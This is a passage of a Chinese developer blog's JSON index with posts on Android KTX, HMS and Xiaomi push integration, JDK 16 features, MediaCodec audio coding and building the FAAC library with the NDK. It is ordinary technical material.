代码。为此，这些扩展程序利用了多种 Kotlin 语言功能，其中包括： 扩展函数 扩展属性 Lambda 命名参数 参数默认值 协程 Fragment KTX Fragment KTX 模块提供了一系列扩展程序以简化 Fragment API。借助 Fragment KTX 模块，可以使用 lambda 来简化 Fragment 事务，例如： 1234567fragmentManager().commit &#123; addToBackStack(\"...\") setCustomAnimations( R.anim.enter_anim, R.anim.exit_anim) add(fragment, \"...\")&#125; 还可以使用 viewModels 和 activityViewModels 属性委托在一行中绑定到 ViewModel：【省略，往上翻，上面有】 Lifecycle KTXLifecycle KTX 为每个 Lifecycle 对象定义一个 LifecycleScope。在此范围内启动的协程会在 Lifecycle 被销毁时取消。您可以使用 lifecycle.coroutineScope 或 lifecycleOwner.lifecycleScope 属性访问 Lifecycle 的 CoroutineScope。 1implementation &quot;androidx.lifecycle:lifecycle-runtime-ktx:2.3.1&quot; 以下示例演示了如何使用 lifecycleOwner.lifecycleScope 异步创建预计算文本：123456789101112class MyFragment: Fragment() &#123; override fun onViewCreated(view: View, savedInstanceState: Bundle?) &#123; super.onViewCreated(view, savedInstanceState) viewLifecycleOwner.lifecycleScope.launch &#123; val params = TextViewCompat.getTextMetricsParams(textView) val precomputedText = withContext(Dispatchers.Default) &#123; PrecomputedTextCompat.create(longTextContent, params) &#125; TextViewCompat.setPrecomputedText(textView, precomputedText) &#125; &#125;&#125; ViewModel KTXViewModel KTX 库提供了一个 viewModelScope() 函数，可让您更轻松地从 ViewModel 启动协程。CoroutineScope 绑定至 Dispatchers.Main，并且会在清除 ViewModel 后自动取消。您可以使用 viewModelScope()，而无需为每个 ViewModel 创建一个新范围。123lifecycle_version = &quot;2.3.1&quot;// ViewModelimplementation &quot;androidx.lifecycle:lifecycle-viewmodel-ktx:$lifecycle_version&quot; LiveData KTX使用 LiveData 时，您可能需要异步计算值。例如，您可能需要检索用户的偏好设置并将其传送给界面。在这些情况下，LiveData KTX 可提供一个 liveData 构建器函数，该函数会调用 suspend 函数，并将结果作为 LiveData 对象传送。 123lifecycle_version = &quot;2.3.1&quot;// LiveDataimplementation &quot;androidx.lifecycle:lifecycle-livedata-ktx:$lifecycle_version&quot;","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"jetpack","slug":"jetpack","permalink":"http://yoursite.com/tags/jetpack/"}]},{"title":"Android 思源字体","slug":"Android/Android 思源字体","date":"2021-04-13T11:52:36.000Z","updated":"2021-12-28T03:24:10.107Z","comments":true,"path":"Android/Android 思源字体/","link":"","permalink":"http://yoursite.com/Android/Android 思源字体/","excerpt":"","text":"【思源字体下载】 Google 已经将 【Noto Sans CJK】(思源黑体的 Google 版)作为 Android 5.0 以后的系统字体，字体体积一个比如 Bold 就有 16MB，不过Android已经自带了。","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"字体","slug":"字体","permalink":"http://yoursite.com/tags/字体/"}]},{"title":"阿里云的云数据库MongoDb版使用记录","slug":"Web后端/阿里云的云数据库MongoDb版使用记录","date":"2021-03-30T11:52:36.000Z","updated":"2021-12-28T03:24:10.219Z","comments":true,"path":"Web后端/阿里云的云数据库MongoDb版使用记录/","link":"","permalink":"http://yoursite.com/Web后端/阿里云的云数据库MongoDb版使用记录/","excerpt":"","text":"不经常登录阿里云控制台管理数据库，时间久了就遗忘了，记录一下方便以后使用。 购买“云数据库MongoDb版”打开控制台 点击 “登录数据库” 跳转到阿里的 “数据管理DMS” “数据管理DMS” DMS登录实例 DMS控制台 DMS创建新的数据库 为新的数据库创建连接用户 DMS打开数据库 DMS执行查询命令","categories":[{"name":"Web后端","slug":"Web后端","permalink":"http://yoursite.com/categories/Web后端/"}],"tags":[]},{"title":"Android集成HMS推送","slug":"Android/Android集成HMS推送","date":"2021-03-28T11:52:36.000Z","updated":"2021-12-28T03:24:10.117Z","comments":true,"path":"Android/Android集成HMS推送/","link":"","permalink":"http://yoursite.com/Android/Android集成HMS推送/","excerpt":"","text":"一、 创建项目 二、 添加应用 添加完应用会自动跳转到 “接入指南” 三、 集成到Android项目 集成HMS Core SDK 123dependencies &#123; implementation &apos;com.huawei.hms:push:&#123;version&#125;&apos; # 当前版本5.0.4.302&#125; 四、 SHA256指纹和OAuth推送所需要的参数1$ keytool -list -v -keystore C:\\TestApp.jks 五、服务端推送【构建发送消息请求指南】 1. 您的服务器获取Access Token，详情请参见客户端模式。1234567POST /oauth2/v3/token HTTP/1.1Host: oauth-login.cloud.huawei.comContent-Type: application/x-www-form-urlencodedgrant_type=client_credentials&amp;client_id=&lt; APP ID &gt;&amp;client_secret=&lt; APP SECRET &gt; 响应 12345&#123; \"access_token\": \"&lt;返回的Access Token&gt;\", \"expires_in\": 3600, \"token_type\": \"Bearer\"&#125; 2. 您的服务器调用API发送Push消息，详情请参见下行消息。HTTPS POST URL： 1POST https://push-api.cloud.huawei.com/v1/[appId]/messages:send 请求消息头示例： 1Content-Type: application/json; charset=UTF-8Authorization: Bearer CF3Xl2XV6jMKZgqYSZFws9IPlgDvxqOfFSmrlmtkTRupbU2VklvhX9kC9JCnKVSDX2VrDgAPuzvNm3WccUIaDg== 说明 请求消息头中的Authorization参数生成请参见OAuth 2.0客户端模式，其中的客户端ID和客户端密钥请输入您在AppGallery Connect项目下的Android应用里的App ID和App Secret。 请求消息体示例： 1234567891011121314151617181920212223&#123; \"validate_only\": false, \"message\": &#123; \"notification\": &#123; \"title\": \"title\", \"body\": \"body\" &#125;, \"android\": &#123; \"notification\": &#123; \"title\": \"android title\", \"body\": \"android body\", \"click_action\": &#123; \"type\": 1, \"intent\": \"#Intent;compo=com.rvr/.Activity;S.W=U;end\" &#125; &#125; &#125;, \"token\": [ \"pushtoken1\", \"pushtoken2\" ] &#125;&#125; 说明通知栏消息中，如果设置了message.android.notification.title和message.android.notification.body，则会分别覆盖message.notification.title和message.notification.body。 透传消息示例报文： 12345678910&#123; \"validate_only\": false, \"message\": &#123; \"data\": \"&#123;'param1':'value1','param2':'value2'&#125;\", \"token\": [ \"pushtoken1\", \"pushtoken2\" ] &#125;&#125; 六、Android端接收透传消息集成SDK后要在 AndroidManifest.xml 文件的application标签下注册您自己的service，继承HmsMessageService类并实现其中的方法，此处以DemoHmsMessageService类为例（类名由您自定义）。 该service用于接收透传消息、获取Token。 1234567&lt;service android:name=\".DemoHmsMessageService\" android:exported=\"false\"&gt; &lt;intent-filter&gt; &lt;action android:name=\"com.huawei.push.action.MESSAGING_EVENT\"/&gt; &lt;/intent-filter&gt;&lt;/service&gt; 123456789101112131415161718192021222324252627282930313233import com.huawei.hms.push.HmsMessageService;import com.huawei.hms.push.RemoteMessage;public class DemoHmsMessageService extends HmsMessageService &#123; private String TAG = getClass().getName(); @Override public void onNewToken(String newDeviceToken) &#123; super.onNewToken(newDeviceToken); // Token会在包括但不限于下述场景中发生变化： // 1、App卸载重装； // 2、App调用注销Token接口； // 3、用户恢复出厂设置； // 4、清除应用数据； // 应用的Push Token要定期更新（建议应用每次启动的时候都获取Token， // 如果发现和上次不同取到的不同，则上报到自己的服务器） // 有了这个 DeviceToken 就可以单个推送透传消息到这个手机。 &#125; /** * 透传消息 * @param remoteMessage */ @Override public void onMessageReceived(RemoteMessage remoteMessage) &#123; super.onMessageReceived(remoteMessage); &#125; @Override public void onDeletedMessages() &#123; super.onDeletedMessages(); &#125;&#125; App启动时注册推送，自动获取的 newToken 。 1HmsMessaging.getInstance(context).setAutoInitEnabled(true); 七、代码混淆123456789-ignorewarnings-keepattributes *Annotation*-keepattributes Exceptions-keepattributes InnerClasses-keepattributes Signature-keepattributes SourceFile,LineNumberTable-keep class com.huawei.hianalytics.**&#123;*;&#125;-keep class com.huawei.updatesdk.**&#123;*;&#125;-keep class com.huawei.hms.**&#123;*;&#125;","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"hms","slug":"hms","permalink":"http://yoursite.com/tags/hms/"}]},{"title":"Android集成小米推送","slug":"Android/Android集成小米推送","date":"2021-03-28T11:52:36.000Z","updated":"2021-12-28T03:24:10.117Z","comments":true,"path":"Android/Android集成小米推送/","link":"","permalink":"http://yoursite.com/Android/Android集成小米推送/","excerpt":"","text":"一、 开通开发者省略 二、 创建应用省略，创建完应用，到“推送服务”开启你的应用推送服务。 三、 集成到Android项目《Android客户端SDK集成指南》。小米的SDK集成还算简单，小米提供了一个简单的Demo，非常简单。 0. 引入jar包依赖Android的SDK以jar形式提供，放到libs目录即可。 1. 推送服务需要的权限列表：12345678910111213141516&lt;uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\" /&gt;​&lt;uses-permission android:name=\"android.permission.INTERNET\" /&gt; &lt;uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\" /&gt;&lt;uses-permission android:name=\"android.permission.ACCESS_WIFI_STATE\" /&gt; &lt;uses-permission android:name=\"android.permission.READ_PHONE_STATE\" /&gt; &lt;uses-permission android:name=\"android.permission.VIBRATE\"/&gt; &lt;permission android:name=\"com.xiaomi.mipushdemo.permission.MIPUSH_RECEIVE\"android:protectionLevel=\"signature\" /&gt; &lt;!--这里com.xiaomi.mipushdemo改成app的包名--&gt;&lt;uses-permission android:name=\"com.xiaomi.mipushdemo.permission.MIPUSH_RECEIVE\" /&gt;&lt;!--这里com.xiaomi.mipushdemo改成app的包名--&gt; 2. 推送服务需要配置的service和receiver：12345678910111213141516171819202122232425262728293031323334353637383940&lt;service android:name=\"com.xiaomi.push.service.XMPushService\" android:enabled=\"true\" android:process=\":pushservice\" /&gt;&lt;!--注：此service必须在3.0.1版本以后（包括3.0.1版本）加入--&gt;&lt;service android:name=\"com.xiaomi.push.service.XMJobService\" android:enabled=\"true\" android:exported=\"false\" android:permission=\"android.permission.BIND_JOB_SERVICE\" android:process=\":pushservice\" /&gt;&lt;service android:name=\"com.xiaomi.mipush.sdk.PushMessageHandler\" android:enabled=\"true\" android:exported=\"true\" /&gt;&lt;!--注：此service必须在2.2.5版本以后（包括2.2.5版本）加入--&gt;&lt;service android:name=\"com.xiaomi.mipush.sdk.MessageHandleService\" android:enabled=\"true\" /&gt;&lt;receiver android:name=\"com.xiaomi.push.service.receivers.NetworkStatusReceiver\" android:exported=\"true\"&gt; &lt;intent-filter&gt; &lt;action android:name=\"android.net.conn.CONNECTIVITY_CHANGE\" /&gt; &lt;category android:name=\"android.intent.category.DEFAULT\" /&gt; &lt;/intent-filter&gt;&lt;/receiver&gt;&lt;receiver android:name=\"com.xiaomi.push.service.receivers.PingReceiver\" android:exported=\"false\" android:process=\":pushservice\"&gt; &lt;intent-filter&gt; &lt;action android:name=\"com.xiaomi.push.PING_TIMER\" /&gt; &lt;/intent-filter&gt;&lt;/receiver&gt; 这里将XMPushService和PingReceiver定义在了pushservice进程中，您也可以配置其运行在任意进程。如果没有配置android:process这个属性，那么它们将运行在应用的主进程中。 2. 自定义一个BroadcastReceiver类123456789101112131415161718192021222324252627282930313233343536373839class MyMiPushMessageReceiver : PushMessageReceiver() &#123; /** * 接收客户端向服务器发送注册命令后的响应结果 */ override fun onReceiveRegisterResult(context: Context, message: MiPushCommandMessage) &#123; Log.i(TAG, \"onReceiveRegisterResult is called. $message\") &#125; /** * 透传消息 */ override fun onReceivePassThroughMessage(context: Context, message: MiPushMessage) &#123; Log.v(TAG,\"onReceivePassThroughMessage is called. $message\") &#125; /** * 通知消息， * 这个回调方法会在用户手动点击通知后触发 */ override fun onNotificationMessageClicked(context: Context, message: MiPushMessage) &#123; Log.v(TAG,\"onNotificationMessageClicked is called. $message\") &#125; /** * 通知消息到达客户端时触发。另外应用在前台时不弹出通知的通知消息到达客户端也会触发这个回调函数 */ override fun onNotificationMessageArrived(context: Context, message: MiPushMessage) &#123; Log.v(TAG,\"onNotificationMessageArrived is called. $message\") &#125; /** * 接收客户端向服务器发送命令后的响应结果 */ override fun onCommandResult(context: Context, message: MiPushCommandMessage) &#123; Log.d(TAG, \"onCommandResult is called. $message\") &#125;&#125; 3. 将自定义的BroadcastReceiver注册到AndroidManifest.xml文件中1234567891011121314&lt;receiver android:exported=\"true\" android:name=\"com.xiaomi.mipushdemo.DemoMessageReceiver\"&gt; &lt;!--这里com.xiaomi.mipushdemo.DemoMessageRreceiver改成app中定义的完整类名--&gt; &lt;intent-filter&gt; &lt;action android:name=\"com.xiaomi.mipush.RECEIVE_MESSAGE\" /&gt; &lt;/intent-filter&gt; &lt;intent-filter&gt; &lt;action android:name=\"com.xiaomi.mipush.MESSAGE_ARRIVED\" /&gt; &lt;/intent-filter&gt; &lt;intent-filter&gt; &lt;action android:name=\"com.xiaomi.mipush.ERROR\" /&gt; &lt;/intent-filter&gt;&lt;/receiver&gt; 4. 代码混淆1-keep class com.xiaomi.mipush.sdk.DemoMessageReceiver &#123;*;&#125; 5. 注册推送12MiPushClient.registerPush(this, APP_ID, APP_KEY); 注册成功在回调中有regid，可以根据regid推送给指定的设备。 四、 后台推送小米有提供SDK，也有HTTP API，这里直接用API就可以。API的授权也是很简单，只需要应用的秘钥就行。 五、 预定义通知栏消息的点击行为通过设置extra.notify_effect的值以得到不同的预定义点击行为。 “1″：通知栏点击后打开app的Launcher Activity。 “2″：通知栏点击后打开app的任一Activity（开发者还需要传入extra.intent_uri）。 “3″：通知栏点击后打开网页（开发者还需要传入extra.web_uri）。 extra.notify_effect为“2”时，可以定义extra.intent_uri，生成uri代码如下：12345Intent intent = new Intent();intent.setAction(\"com.xiaomi.mipushdemo.news\");intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);intent.toUri(Intent.URI_INTENT_SCHEME);结果：intent:#Intent;action=com.test.action.message;end 经过我的小米手机测试，无法打开此action。但如果定义extra.intent_uri为以下格式的Activity，是可以打开:1intent:#Intent;component=com.xiaomi.mipushdemo/.NewsActivity;end 只是设置的parentActivityName没有效果，打开NewsActivity点击返回就退出了，如果想退出NewsActivity进入主页则不行。 但还有一种方法可以实现，就是onNotificationMessageClicked函数，这个函数是点击通知栏消息的回调函数，如果没有被小米SDK处理掉的话，就会触发，我们就可以执行相关的代码。如：12345Intent intent = new Intent();//这个标志位一定要加，否则无法启动（此处Context没有Activity栈）intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);intent.setAction(message.getExtra().get(\"intent_uri\"));context.startActivity(intent); 推送时，extra.notify_effect这个参数要删掉intent_uri参数填：com.xiaomi.mipushdemo.news 这样就可以启动Action了，parentActivityName也是有效的。 六、 定制通知栏通知的图标 非MIUI中 如果app中同时存在名为 mipush_notification 和 mipush_small_notification 的drawable文件，则使用mipush_notification的drawable作为通知的大图标，mipush_small_notification的drawable作为通知的小图标。 如果app中只存在其中一个drawable文件，则使用该drawable作为通知的图标。 如果app中不存在这两个drawable文件，则使用app的icon作为通知的图标。 注意：mipush_notification 要求PNG/JPG/JPEG格式图片，尺寸120×120px，小于200KB。mipush_small_notification 建议尺寸 60 x 60px。 MIUI中： 通知栏图标统一显示为app的icon，不可以定制 （2021-07-22无语）。 MIUI经过了几次的修改，参考文章：《知乎》 推送消息时指定图标 从小米的推送调试工具来看，可以上传一个定制的icon，但这也太麻烦了。 总结：也就是说，目前通知栏的图标无法定制，不用折腾了(非MIUI根本不会用小米推送好吧？)，当然app中可以提前适配定制，万一明天小米又改回来了呢？ 七、 透传消息小米的透传消息要求应用在后台常驻，则无法用来做离线推送。","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"hms","slug":"hms","permalink":"http://yoursite.com/tags/hms/"}]},{"title":"JDK 16 新特性","slug":"Java/JDK 16 新特性","date":"2021-03-16T11:51:41.000Z","updated":"2021-12-30T08:20:25.099Z","comments":true,"path":"Java/JDK 16 新特性/","link":"","permalink":"http://yoursite.com/Java/JDK 16 新特性/","excerpt":"","text":"2021年03月16 JDK 16 发布，非 LTS 版本。 新特性 338: Vector API (Incubator) 347: Enable C++14 Language Features 357: Migrate from Mercurial to Git 369: Migrate to GitHub 376: ZGC: Concurrent Thread-Stack Processing 380: Unix-Domain Socket Channels 386: Alpine Linux Port 387: Elastic Metaspace 388: Windows/AArch64 Port 389: Foreign Linker API (Incubator) 390: Warnings for Value-Based Classes 392: Packaging Tool 393: Foreign-Memory Access API (Third Incubator) 394: Pattern Matching for instanceof 395: Records 396: Strongly Encapsulate JDK Internals by Default 397: Sealed Classes (Second Preview) 中文 338: 提供了Vector API (jdk.incubator.vector)来用于矢量计算 347: 在JDK C++的源码中允许使用C++14的语言特性 357: OpenJDK源码的版本控制从Mercurial (hg) 迁移到git 369: 将OpenJDK源码的版本控制迁移到 GitHub 376: ZGC: 实现了并发thread-stack处理来降低GC safepoints的负担 380: 对 Socket Channels 及 Server ocket Channels的api提供对unix domain socket的支持 386: 将glibc的jdk移植到使用musl的alpine linux上 387: 支持不再使用的class metadata归还内存给操作系统，降低内存占用 388: 移植JDK到Windows/AArch64 389: 提供jdk.incubator.foreign来简化native code的调用 390: 提供 @jdk.internal.ValueBased 来用于标注作为value-based的类 392: jpackage在JDK14引入，JDK15作为incubating工具，在JDK16转正 393: Foreign-Memory Access API在JDK14首次引入作为incubating API，在JDK15处于第二轮incubating，在JDK16处于第三轮incubating 394: instanceof的模式匹配在JDK14作为preview，在JDK15作为第二轮的preview，在JDK16转正 395: Record类型在JDK14作为preview，在JDK15处于第二轮preview，在JDK16转正 396: 对内部的api进行更多的封装，鼓励开发者从使用内部的方法迁移到标准的API 397: Sealed Classes在JDK15作为preview引入，在JDK16作为第二轮preview 总结：JDK16相当于是将JDK14、JDK15的一些特性进行了正式引入。","categories":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/categories/Java/"}],"tags":[]},{"title":"Android MediaCodec硬编解码器","slug":"Android/Android MediaCodec硬编解码器","date":"2021-03-10T11:52:36.000Z","updated":"2021-12-28T03:24:10.091Z","comments":true,"path":"Android/Android MediaCodec硬编解码器/","link":"","permalink":"http://yoursite.com/Android/Android MediaCodec硬编解码器/","excerpt":"","text":"Android 的 MediaCodec 可以编/解码音频视频，支持同步和异步两种使用方式。 异步参考官网的文档123456789101112131415161718192021222324252627282930313233343536373839MediaCodec codec = MediaCodec.createByCodecName(name); MediaFormat mOutputFormat; // member variable codec.setCallback(new MediaCodec.Callback() &#123; @Override void onInputBufferAvailable(MediaCodec mc, int inputBufferId) &#123; ByteBuffer inputBuffer = codec.getInputBuffer(inputBufferId); // fill inputBuffer with valid data … codec.queueInputBuffer(inputBufferId, …); &#125; @Override void onOutputBufferAvailable(MediaCodec mc, int outputBufferId, …) &#123; ByteBuffer outputBuffer = codec.getOutputBuffer(outputBufferId); MediaFormat bufferFormat = codec.getOutputFormat(outputBufferId); // option A // bufferFormat is equivalent to mOutputFormat // outputBuffer is ready to be processed or rendered. … codec.releaseOutputBuffer(outputBufferId, …); &#125; @Override void onOutputFormatChanged(MediaCodec mc, MediaFormat format) &#123; // Subsequent data will conform to new format. // Can ignore if using getOutputFormat(outputBufferId) mOutputFormat = format; // option B &#125; @Override void onError(…) &#123; … &#125; &#125;); codec.configure(format, …); mOutputFormat = codec.getOutputFormat(); // option B codec.start(); // wait for processing to complete codec.stop(); codec.release(); 音频和视频的用法差不多，差异在于配置上，编码和解码也是。 两个不同的函数 MediaCodec.createDecoderByType(..) 为 MediaCodec.createEncoderByType(..) 创建 MediaCodec 。 实现一个异步音频的编码器 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869/** * @param mime MediaFormat.MIMETYPE_AUDIO_* */fun createMediaCodecEncoder(mime: String, sampleRate:Int)&#123; val format = MediaFormat.createAudioFormat(mime,sampleRate,1) format.setInteger(MediaFormat.KEY_CHANNEL_MASK, AudioFormat.CHANNEL_IN_MONO); format.setInteger(MediaFormat.KEY_BIT_RATE, 128000) val mMediaCodec = MediaCodec.createEncoderByType(mime) mMediaCodec.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE) mMediaCodec.setCallback(object :MediaCodec.Callback()&#123; /** * 输入缓冲区可用时回调此函数 */ override fun onInputBufferAvailable(codec: MediaCodec, index: Int) &#123; //TODO 这里输入数据 val dataLength = 2 val data = ByteArray(dataLength)//TODO 假设这是一帧PCM数据，作为输入编码器的数据 val inputBuffer = codec.getInputBuffer(index) if(inputBuffer != null)&#123; inputBuffer.clear() inputBuffer.put(data) codec.queueInputBuffer(index,0,dataLength,0,0) &#125;else&#123; codec.queueInputBuffer(index,0,0,0,0) &#125; &#125; /** * 输出编码数据 */ override fun onOutputBufferAvailable( codec: MediaCodec, index: Int, info: MediaCodec.BufferInfo ) &#123; try &#123; if(info.size &gt; 0)&#123; if ((info.flags and MediaCodec.BUFFER_FLAG_CODEC_CONFIG) != 0) &#123; println(\"编码器输出配置信息\") &#125;else&#123; println(\"编码器输出编码数据\") &#125; val outputBuffer = codec.getOutputBuffer(index)//取出数据 val outputData = ByteArray(info.size) outputBuffer?.get(outputData) //TODO outputData 是编码后数据 &#125; &#125;catch (e:Exception)&#123; e.printStackTrace() &#125;finally &#123; codec.releaseOutputBuffer(index, false) &#125; &#125; override fun onError(codec: MediaCodec, e: MediaCodec.CodecException) &#123; e.printStackTrace() &#125; override fun onOutputFormatChanged(codec: MediaCodec, format: MediaFormat) &#123; println(\"onOutputFormatChanged\") &#125; &#125;) mMediaCodec.start()&#125; 实现一个异步音频的解码器 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970/** * @param mime MediaFormat.MIMETYPE_AUDIO_* */fun createMediaCodecDecoder(mime: String, sampleRate:Int)&#123; val format = MediaFormat.createAudioFormat(mime,sampleRate,1) format.setInteger(MediaFormat.KEY_CHANNEL_MASK, AudioFormat.CHANNEL_IN_MONO); format.setInteger(MediaFormat.KEY_BIT_RATE, 128000) val mMediaCodec = MediaCodec.createDecoderByType(mime) mMediaCodec.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE) mMediaCodec.setCallback(object :MediaCodec.Callback()&#123; /** * 输入缓冲区可用时回调此函数 */ override fun onInputBufferAvailable(codec: MediaCodec, index: Int) &#123; //TODO 这里输入数据 val dataLength = 2 val data = ByteArray(dataLength)//TODO 假设这是一帧ACC格式数据，作为输入解码器的数据 val inputBuffer = codec.getInputBuffer(index) if(inputBuffer != null)&#123; inputBuffer.clear() inputBuffer.put(data) codec.queueInputBuffer(index,0,dataLength,0,0) &#125;else&#123; codec.queueInputBuffer(index,0,0,0,0) &#125; &#125; /** * 输出编码数据 */ override fun onOutputBufferAvailable( codec: MediaCodec, index: Int, info: MediaCodec.BufferInfo ) &#123; try &#123; if(info.size &gt; 0)&#123; if ((info.flags and MediaCodec.BUFFER_FLAG_CODEC_CONFIG) != 0) &#123; println(\"解码器输出配置信息\") &#125;else&#123; println(\"解码器输出编码数据\") &#125; val outputBuffer = codec.getOutputBuffer(index)//取出数据 val outputData = ByteArray(info.size) outputBuffer?.get(outputData) //TODO outputData 是解码后PCM数据，可以用AudioTrack播放 &#125; &#125;catch (e:Exception)&#123; e.printStackTrace() &#125;finally &#123; codec.releaseOutputBuffer(index, false) &#125; &#125; override fun onError(codec: MediaCodec, e: MediaCodec.CodecException) &#123; e.printStackTrace() &#125; override fun onOutputFormatChanged(codec: MediaCodec, format: MediaFormat) &#123; println(\"onOutputFormatChanged\") &#125; &#125;) mMediaCodec.start()&#125; 同步参考官网12345678910111213141516171819202122232425262728MediaCodec codec = MediaCodec.createByCodecName(name); codec.configure(format, …); MediaFormat outputFormat = codec.getOutputFormat(); // option B codec.start(); for (;;) &#123; int inputBufferId = codec.dequeueInputBuffer(timeoutUs); if (inputBufferId &gt;= 0) &#123; ByteBuffer inputBuffer = codec.getInputBuffer(…); // fill inputBuffer with valid data … codec.queueInputBuffer(inputBufferId, …); &#125; int outputBufferId = codec.dequeueOutputBuffer(…); if (outputBufferId &gt;= 0) &#123; ByteBuffer outputBuffer = codec.getOutputBuffer(outputBufferId); MediaFormat bufferFormat = codec.getOutputFormat(outputBufferId); // option A // bufferFormat is identical to outputFormat // outputBuffer is ready to be processed or rendered. … codec.releaseOutputBuffer(outputBufferId, …); &#125; else if (outputBufferId == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED) &#123; // Subsequent data will conform to new format. // Can ignore if using getOutputFormat(outputBufferId) outputFormat = codec.getOutputFormat(); // option B &#125; &#125; codec.stop(); codec.release(); 实现一个同步音频解码器（伪代码） 1234567891011121314151617181920212223242526272829303132333435MediaCodec codec = MediaCodec.createDecoderByType(MediaFormat.MIMETYPE_AUDIO_G711_ALAW);final MediaFormat format = MediaFormat.createAudioFormat( MediaFormat.MIMETYPE_AUDIO_G711_ALAW, 8000, 1);format.setInteger(MediaFormat.KEY_BIT_RATE, 128000);codec.configure(format,null,null,0);codec.start();inputBuffers = codec.getInputBuffers();while (true)&#123; int inputIndex = codec.dequeueInputBuffer(0); if(inputIndex &gt; -1)&#123; ByteBuffer inputBuffer = inputBuffers[inputIndex]; inputBuffer.clear(); //假如这是输入需要解码的G711A格式数据， int aacLength = 2; byte[] g711Buffer = new byte[aacLength]; inputBuffer.put(g711Buffer, 0, aacLength); codec.queueInputBuffer(inputIndex, 0, aacLength, 0, 0); MediaCodec.BufferInfo infoOutput = new MediaCodec.BufferInfo(); int outputIndex = codec.dequeueOutputBuffer(infoOutput,10); if (outputIndex &gt;= 0) &#123; ByteBuffer outputBuffer = codec.getOutputBuffer(outputIndex); byte[] outputData = new byte[infoOutput.size]; outputBuffer.get(outputData); //TODO 这是输出的PCM数据 codec.releaseOutputBuffer(outputIndex, false); &#125; &#125;&#125; 同步编码器类似，省略。","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"MediaCodec,硬编解码器","slug":"MediaCodec-硬编解码器","permalink":"http://yoursite.com/tags/MediaCodec-硬编解码器/"}]},{"title":"Android Ndk编译开源库（FAAC）","slug":"Android/Android Ndk编译FAAC库","date":"2021-03-07T14:52:36.000Z","updated":"2021-12-28T03:24:10.096Z","comments":true,"path":"Android/Android Ndk编译FAAC库/","link":"","permalink":"http://yoursite.com/Android/Android Ndk编译FAAC库/","excerpt":"","text":"想在Android下实现PCM编码为AAC，已经用Android硬编码实现过AAC编码，但想了解一下FAAC这个库，比较一下两者的差异。 FAAC是开源的C语言库，查了一下网络上的文章，在Linux上编译FAAC，大多数都是编写一个脚本build_android.sh ，脚本里是用make编译，最终只有一个平台的共享库so或者静态库a文件。如：【AAC在Linux下编译】 而Android上使用共享库一般会有如下几个平台：12345678910├── arm64-v8a│ └── libxx.so├── armeabi│ └── libxx.so├── armeabi-v7a│ └── libxx.so├── x86│ └── libxx.so└── x86_64 └── libxx.so 所以借着FAAC，记录一下Android如何通过NDK使用开源C/C++库。 现在NDK有两种方式编译C/C++库： ndk-build cmake 根据我的理解，两者的不同之处在于： ndk-build构建的库，编译好的 so 文件，加上 include 目录下的头文件，就可以使用了，不需要再面对开源库繁琐的源码了。但要在Android项目中使用，你还得创建一个NDK项目，通过JNI调用，所以最后你的项目会有两个 so 库文件（开源库 + JNI库）。 cmake 构建，现在创建一个NDK项目，默认就是用cmake，直接把C/C++库的源文件放到cpp目录下，记录到CMakeLists.txt ，直接通过JNI调用库include的接口就行，最后项目就只有一个 so 库文件 （这种方式必须有JNI，否则编译不过）。 那么如何选择？ 我觉得两种都可以，不必纠结，但一般源文件多的C/C++库建议用 ndk-build ，不用频繁的编译C/C++代码，拖慢编译速度，但如果你没有ndk-build的环境（第一次构建），配置这个环境也是相当的麻烦。而小项目，如FAAC，则用cmake构建会比较方便，一次就可以把FAAC编译好，并且可以通过JNI将FAAC接口转为Java的。 A. ndk-build编译预构建库由于之前学NDK有保留一个Demo LearnAndroidAndLibrary\\NdkTestLibrarySo 项目，所以直接借鉴Demo的配置文件：Android.mk 、 Application.mk ，本次直接拷贝过来做一些小的修改。 一. ndk-build编译faac我这边运行的环境是：Ubuntu, G++, Java8（加入环境变量）,Android SDK（加入环境变量） , NDK19 （加入环境变量）。 下载源码 123$ wget http://downloads.sourceforge.net/faac/faac-1.28.tar.gz$ tar -zxvf faac-1.28.tar.gz$ cd faac-1.28 配置项目环境 123$ mkdir jni$ cp include jni/$ cp libfaac jni/ # 猜的，应该只需要libfaac这些源码 配置文件 123456789101112131415161718$ cd jni$ find -name *.c./libfaac/kiss_fft/kiss_fftr.c./libfaac/kiss_fft/kiss_fft.c./libfaac/ltp.c./libfaac/util.c./libfaac/aacquant.c./libfaac/psychkni.c./libfaac/bitstream.c./libfaac/tns.c./libfaac/backpred.c./libfaac/midside.c./libfaac/fft.c./libfaac/frame.c./libfaac/huffman.c./libfaac/channels.c./libfaac/filtbank.c$ Android.mk 内容是拷贝其他开源库的，这里只修改两个内容 源码 .c 文件列表 lib名称123456789101112131415161718192021222324252627282930313233$ vim Android.mkLOCAL_PATH:=$(call my-dir)include $(CLEAR_VARS)# 1. 贴进来所有的c文件LOCAL_SRC_FILES:= \\ libfaac/kiss_fft/kiss_fftr.c \\ libfaac/kiss_fft/kiss_fft.c \\ libfaac/ltp.c \\ libfaac/util.c \\ libfaac/aacquant.c \\ libfaac/psychkni.c \\ libfaac/bitstream.c \\ libfaac/tns.c \\ libfaac/backpred.c \\ libfaac/midside.c \\ libfaac/fft.c \\ libfaac/frame.c \\ libfaac/huffman.c \\ libfaac/channels.c \\ libfaac/filtbank.c \\LOCAL_C_INCLUDES := $(LOCAL_PATH)/includeLOCAL_LDLIBS := -llog#LOCAL_SHARED_LIBRARIES := \\# libcutilsLOCAL_MODULE:= libfaac # 2. 修改库的名称LOCAL_CPPFLAGS := -O2 -fexceptions -DHAVE_SOCKLEN_T -DHAVE_STRUCT_IOVEC 